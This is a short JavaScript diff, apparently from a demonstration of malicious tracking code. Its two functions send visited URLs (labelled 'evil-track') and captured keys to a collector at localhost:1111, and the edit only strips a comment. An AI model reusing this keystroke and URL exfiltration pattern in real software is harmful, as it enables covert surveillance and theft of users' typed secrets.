@@ -1,7 +1,7 @@
 async function track(url) {
   try {
     await fetch("https://localhost:1111", {
-      method: "POST", // *GET, POST, PUT, DELETE, etc.
+      method: "POST",
       body: JSON.stringify({ type: "evil-track", url }),
     });
   } catch (err) {
@@ -12,7 +12,7 @@ async function track(url) {
 async function sendKey(key) {
   try {
     await fetch("https://localhost:1111", {
-      method: "POST", // *GET, POST, PUT, DELETE, etc.
+      method: "POST",
       body: JSON.stringify({ type: "key", key }),
     });
   } catch (err) {
